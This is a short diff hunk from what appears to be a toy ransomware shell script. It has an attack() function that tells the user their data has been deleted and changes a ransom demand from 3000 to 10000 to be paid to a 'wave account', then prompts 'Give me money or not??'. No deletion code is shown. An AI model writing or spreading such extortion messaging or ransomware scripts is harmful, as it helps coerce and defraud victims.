@@ -8,7 +8,7 @@ attack()
     clear
     echo "your data have been delected"
     echo "If you want back..."
-    echo "give me 3000 to my wave account :\")"
+    echo "give me 10000 to my wave account :\")"
     read -p "Give me money or not?? [yes/no] :" m
     if [[ $m == "yes" ]]
     then
